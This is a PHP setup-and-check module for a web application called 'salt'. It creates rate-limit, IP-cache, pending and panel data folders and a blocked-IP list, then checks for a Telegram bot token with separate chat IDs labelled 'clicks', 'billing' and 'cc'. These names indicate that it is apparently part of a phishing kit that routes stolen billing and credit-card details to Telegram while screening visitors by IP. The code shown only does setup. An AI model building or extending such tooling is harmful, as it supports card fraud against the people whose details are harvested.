<?php

declare(strict_types=1);

function salt_runtime_init(): void
{
    $root = defined('SALT_ROOT') ? SALT_ROOT : dirname(__DIR__, 2);
    $dirs = [
        $root . '/data',
        $root . '/data/ratelimit',
        $root . '/data/ipcache',
        $root . '/data/pending',
        $root . '/data/panel',
    ];

    foreach ($dirs as $dir) {
        if (!is_dir($dir)) {
            mkdir($dir, 0750, true);
        }
    }

    $blocked = $root . '/data/blocked-ips.json';
    if (!is_file($blocked)) {
        file_put_contents($blocked, "{}\n");
    }

    $htaccess = $root . '/data/.htaccess';
    if (!is_file($htaccess)) {
        file_put_contents($htaccess, "Require all denied\n");
    }
}

function salt_runtime_check(): array
{
    $root = defined('SALT_ROOT') ? SALT_ROOT : dirname(__DIR__, 2);
    $checks = [];

    $checks['php_version'] = [
        'ok' => PHP_VERSION_ID >= 80000,
        'value' => PHP_VERSION,
    ];

    $checks['allow_url_fopen'] = [
        'ok' => (bool) ini_get('allow_url_fopen'),
        'value' => ini_get('allow_url_fopen') ? 'on' : 'off',
    ];

    $writable = [];
    foreach (['data', 'data/ratelimit', 'data/ipcache', 'data/pending', 'data/panel', 'data/blocked-ips.json'] as $rel) {
        $path = $root . '/' . $rel;
        $writable[$rel] = is_dir($path) ? is_writable($path) : (is_file($path) && is_writable($path));
    }
    $checks['writable'] = [
        'ok' => !in_array(false, $writable, true),
        'paths' => $writable,
    ];

    $tg = is_file($root . '/config/telegram.php') ? require $root . '/config/telegram.php' : [];
    $token = trim((string) ($tg['bot_token'] ?? ''));
    $clicks = trim((string) ($tg['chat_id_clicks'] ?? ''));
    $billing = trim((string) ($tg['chat_id_billing'] ?? ''));
    $cc = trim((string) ($tg['chat_id_cc'] ?? ''));
    $checks['telegram'] = [
        'ok' => $token !== '' && $clicks !== '' && $billing !== '' && $cc !== '',
        'bot_token' => $token !== '',
        'chat_id_clicks' => $clicks !== '',
        'chat_id_billing' => $billing !== '',
        'chat_id_cc' => $cc !== '',
    ];

    return $checks;
}
